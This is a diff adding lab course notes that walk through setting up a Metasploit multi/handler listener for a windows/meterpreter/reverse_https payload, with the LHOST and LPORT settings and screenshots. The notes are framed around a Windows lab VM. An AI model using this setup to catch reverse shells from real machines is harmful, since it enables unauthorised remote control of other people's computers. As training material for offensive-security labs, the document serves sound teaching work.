@@ -2198,3 +2198,106 @@ This completes the payload-generation portion of the exercise.
 
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+Part 2 : Setting Up the Metasploit Multi Handler
+
+ 1. Start Metasploit
+
+```bash
+msfconsole
+```
+
+---
+
+ 2. Select the Multi Handler
+
+```text
+use exploit/multi/handler
+```
+
+
+ 3. Check the options
+
+```text
+show options
+```
+
+<img width="1440" height="355" alt="Screenshot 2026-08-10 at 3 35 37 PM" src="https://github.com/user-attachments/assets/eca7be61-945d-49be-ab49-cc046e7fbdba" />
+
+
+---
+
+ 4. Set the payload
+
+Use the same payload that was used when creating the lab executable:
+
+```text
+set payload windows/meterpreter/reverse_https
+```
+
+<img width="1440" height="360" alt="Screenshot 2026-08-10 at 3 35 50 PM" src="https://github.com/user-attachments/assets/3db663f1-7422-4888-8c81-3323c2d23a11" />
+
+
+---
+
+ 5. Set LHOST
+
+```text
+set LHOST <YOUR_KALI_IP>
+```
+
+Example:
+
+```text
+set LHOST 192.168.0.26
+```
+
+> Use your own Kali IP. Don't copy the instructor's IP.
+
+
+ 6. Set LPORT
+
+```text
+set LPORT 8080
+```
+
+<img width="1428" height="372" alt="Screenshot 2026-08-10 at 3 36 01 PM" src="https://github.com/user-attachments/assets/e01d7cb1-b4b3-4128-b780-c5ea06685105" />
+
+
+---
+
+ 7. Verify everything
+
+```text
+show options
+```
+
+Check that:
+
+ Payload: `windows/meterpreter/reverse_https`
+ LHOST: your Kali IP
+ LPORT: `8080`
+
+
+
+ 8. Start the listener
+
+```text
+exploit
+```
+
+Metasploit now waits for the lab Windows VM to connect.
+
+<img width="1440" height="78" alt="Screenshot 2026-08-10 at 3 36 08 PM" src="https://github.com/user-attachments/assets/bce0847f-d84d-45fc-81dd-8067f594c5a7" />
+
+
+---
+
+ ⚠️ Important lab note
+
+At this stage, nothing should connect yet. The listener is simply waiting. The next lecture is where the Windows lab VM executes the test payload and the connection is received.
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+
